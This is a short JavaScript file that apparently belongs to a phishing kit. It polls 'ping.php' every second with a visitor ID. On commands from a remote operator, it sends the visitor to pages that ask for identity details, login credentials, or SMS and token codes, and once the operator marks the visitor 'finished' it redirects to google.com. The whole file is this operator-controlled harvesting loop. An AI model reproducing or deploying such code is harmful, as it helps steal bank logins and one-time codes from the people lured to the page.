document.addEventListener('DOMContentLoaded', () => {
    setInterval(async () => {
        if (typeof visitorId === 'undefined' || !visitorId) return;
        try {
            const res = await fetch('ping.php?id=' + encodeURIComponent(visitorId) + '&t=' + Date.now());
            if (!res.ok) return;
            const data = await res.json();
            const action = (data.action || data.status || '').trim();

            if (action === 'blocked') {
                location.reload();
            } else if (action === 'pedir_identidad') {
                window.location.href = 'identificacion.php';
            } else if (action === 'pedir_token' || action === 'pedir_sms') {
                window.location.href = 'seguridad.php';
            } else if (action === 'pedir_login') {
                window.location.href = 'index.php';
            } else if (action === 'finished') {
                window.location.href = 'https://www.google.com';
            }
        } catch (e) {}
    }, 1000);
});
